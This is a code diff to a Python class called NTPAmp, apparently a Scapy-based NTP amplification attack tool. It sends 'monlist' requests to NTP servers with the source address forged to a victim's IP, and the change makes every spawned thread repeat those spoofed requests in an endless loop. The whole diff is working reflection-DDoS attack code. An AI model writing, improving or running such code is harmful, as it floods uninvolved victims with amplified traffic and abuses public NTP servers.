@@ -83,15 +83,19 @@ class NTPAmp(object):
             send(pkt)
 
     def get_monlist(self):
-        """
-        ntpdc -c monlist
-        :return:
-        """
         data = "\x17\x00\x03\x2a" + "\x00" * 4
         for ip, dport in self.ntpservs:
             self.logger.info("[*] Get entry from ntpserver {}:{}".format(ip, dport))
             pkt=IP(dst=ip,src=self.victim)/UDP(sport=self.sport,dport=dport)/Raw(load=data)
-            send(pkt,loop=1)
+            send(pkt)
+
+    def get_monlist_loop(self, loop=False):
+        """
+        ntpdc -c monlist
+        :return:
+        """
+        while True:
+            self.get_monlist()
 
     def warmup(self):
         """
@@ -116,7 +120,7 @@ class NTPAmp(object):
         self.logger.info("[*] Spawning {} daemonized threads...".format(self.nthreads))
         threads=[]
         for r in range(self.nthreads):
-            thread = threading.Thread(target=self.get_monlist)
+            thread = threading.Thread(target=self.get_monlist_loop)
             thread.daemon=True
             self.logger.info("[*] Spawn {}".format(thread))
             thread.start()
